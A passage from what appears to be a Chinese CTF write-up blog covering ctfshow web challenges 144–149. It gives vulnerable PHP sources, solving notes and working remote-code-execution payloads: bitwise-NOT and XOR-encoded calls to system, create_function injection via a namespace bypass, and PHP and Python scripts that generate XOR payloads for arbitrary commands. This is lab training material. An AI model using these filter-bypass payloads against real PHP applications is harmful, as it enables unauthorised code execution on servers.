&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)===<span class="hljs-number">1</span>?<span class="hljs-literal">true</span>:<span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>这里限制了$v3的长度必须为1，所以我们可以把命令写到$v2上</strong></p><p><strong>构造出<code>eval(&quot;return 1-phpinfo();&quot;);</code></strong></p><p>payload</p><p>system(‘tac f*’)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>-&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span>(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>C<span class="hljs-variable">%DF</span><span class="hljs-variable">%99</span><span class="hljs-variable">%D5</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="web-145（无字母数字命令执行（三目运算符））"><a href="#web-145（无字母数字命令执行（三目运算符））" class="headerlink" title="web-145（无字母数字命令执行（三目运算符））"></a>web-145（无字母数字命令执行（三目运算符））</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这题依然还是无字母数字命令执行，但是过滤掉了+-*&#x2F;，但是这里还可以用三目运算符</p><p><strong>测试<code>eval(&quot;return 1?phpinfo():1;&quot;);</code></strong></p><p><strong>能执行phpinfo</strong></p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>?(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>C<span class="hljs-variable">%DF</span><span class="hljs-variable">%99</span><span class="hljs-variable">%D5</span>):&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-146（无字母数字命令执行（等号-、位运算符-））"><a href="#web-146（无字母数字命令执行（等号-、位运算符-））" class="headerlink" title="web-146（无字母数字命令执行（等号&#x3D;、位运算符||））"></a>web-146（无字母数字命令执行（等号&#x3D;、位运算符||））</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>这题比上题又多过滤了; : ?，还可以用等号（&#x3D;）和位运算符（||）</strong></p><p><strong>测试发现<code>eval(&quot;return 1==phpinfo()||1;&quot;);</code></strong></p><p><strong>可以执行phpinfo</strong></p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>C<span class="hljs-variable">%DF</span><span class="hljs-variable">%99</span><span class="hljs-variable">%D5</span>)||&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-147（create-function函数）"><a href="#web-147（create-function函数）" class="headerlink" title="web-147（create_function函数）"></a>web-147（create_function函数）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="hljs-variable">$ctfshow</span>)) &#123;<br>        <span class="hljs-variable">$ctfshow</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>参考文章</strong>：<a href="https://paper.seebug.org/755/">https://paper.seebug.org/755/</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。<br><br>system =&gt;\system            \是全局命名空间<br>/^[a-z0<span class="hljs-number">-9</span>_]*$/isD<br>/i不区分大小写<br>/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]<br>/D如果使用$限制结尾字符,则不允许结尾有换行<span class="hljs-comment">; </span><br>数字字母下划线都被过滤了<br><br>这个正则可以用%<span class="hljs-number">5</span>c(/)绕过<br></code></pre></td></tr></table></figure><p><strong>可利用create_function()进行代码注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs undefined">create_function的第一个参数是参数，第二个参数是内容。<br>create_function(&#x27;$a&#x27;,&#x27;return 123&#x27;)<br><br>类似于：<br>function f($a) &#123;<br>  return 123;<br>&#125;<br>如果我们第二个参数传入 echo 1;&#125;phpinfo();//<br>function f($a) &#123;<br>  echo 1;&#125;phpinfo();//<br>&#125;<br>可以执行phpinfo()命令<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">get: show=echo <span class="hljs-number">123</span>;&#125;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-regexp">//</span><br>post: ctf=<span class="hljs-variable">%5ccreate_function</span><br></code></pre></td></tr></table></figure><p><strong>原理：</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,$ctfshow)) &#123; <br>%5ccreate_function(<span class="hljs-string">&#x27;&#x27;</span>,echo <span class="hljs-number">123</span>;&#125;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//);&#125;</span><br></code></pre></td></tr></table></figure><hr><h3 id="create-function（）"><a href="#create-function（）" class="headerlink" title="create_function（）"></a>create_function（）</h3><p>create_function()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs undefined">create_function的第一个参数是参数，第二个参数是内容。<br><br>create_function(&#x27;$a&#x27;,&#x27;return 123&#x27;)<br><br>类似于：<br>function f($a) &#123;<br>  return 123;<br>&#125;<br><br>如果我们第二个参数传入 echo 1;&#125;phpinfo();//<br>function f($a) &#123;<br>  echo 1;&#125;phpinfo();//<br>&#125;<br>可以执行phpinfo()命令<br></code></pre></td></tr></table></figure><hr><h2 id="web-148（无字母数字命令执行（异或绕过））"><a href="#web-148（无字母数字命令执行（异或绕过））" class="headerlink" title="web-148（无字母数字命令执行（异或绕过））"></a>web-148（无字母数字命令执行（异或绕过））</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_ctfshow_fl0g</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><p><strong>没有过滤^,所以可以用异或构造：</strong></p><p><strong>使用脚本时注意修改脚本中的正则。</strong></p><p><strong>python脚本：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure><p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># author yu22x</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">[+] your function：<span class="hljs-keyword">system</span><br>[+] your command：ls<br>(<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>2<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>5<span class="hljs-variable">%0d</span>&quot;</span>^<span class="hljs-string">&quot;%7b%7b%7b%7c<span class="hljs-variable">%6</span>0<span class="hljs-variable">%60</span>&quot;</span>)(<span class="hljs-string">&quot;%0c<span class="hljs-variable">%08</span>&quot;</span>^<span class="hljs-string">&quot;<span class="hljs-variable">%6</span>0<span class="hljs-variable">%7b</span>&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=(<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>2<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>9<span class="hljs-variable">%0</span>5<span class="hljs-variable">%0d</span>&quot;</span>^<span class="hljs-string">&quot;%7b%7b%7b%7d<span class="hljs-variable">%6</span>0<span class="hljs-variable">%60</span>&quot;</span>)(<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>9<span class="hljs-variable">%0</span>1<span class="hljs-variable">%0</span>3<span class="hljs-variable">%0</span>1<span class="hljs-variable">%0</span>6<span class="hljs-variable">%02</span>&quot;</span>^<span class="hljs-string">&quot;%7d<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2</span>1<span class="hljs-variable">%6</span>0<span class="hljs-variable">%28</span>&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>法二：中文变量</strong></p><p>payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>ode=<span class="hljs-variable">$哈</span>=<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>;<span class="hljs-variable">$&#123;</span><span class="hljs-variable">$哈</span>&#125;[哼](<span class="hljs-variable">$&#123;</span><span class="hljs-variable">$哈</span>&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*<br>其中<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span> ^ <span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>异或得到_GET<br><span class="hljs-variable">$哈</span>=_GET;<br><span class="hljs-variable">$_GET</span>[哼](<span class="hljs-variable">$_GET</span>[嗯]);<br><span class="hljs-string">?哼</span>=system&amp;嗯=tac f*<br></code></pre></td></tr></table></figure><hr><h2 id="web-149（file-put-contents）"><a href="#web-149（file-put-contents）" class="headerlink" title="web-149（file_put_contents）"></a>web-149（file_put_contents）</h2><p>源码：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gams">error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(__FILE__);<br><br><span class="hljs-meta"><span class="hljs-keyword">$files</span> = scandir(&#x27;./&#x27;); </span><br>foreach(<span class="hljs-symbol">$</span><span class="hljs-keyword">files</span> as <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br>file_put_contents(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-symbol">$</span>_POST[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-meta"><span class="hljs-keyword">$files</span> = scandir(&#x27;./&#x27;); </span><br>foreach(<span class="hljs-symbol">$</span><span class="hljs-keyword">files</span> as <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            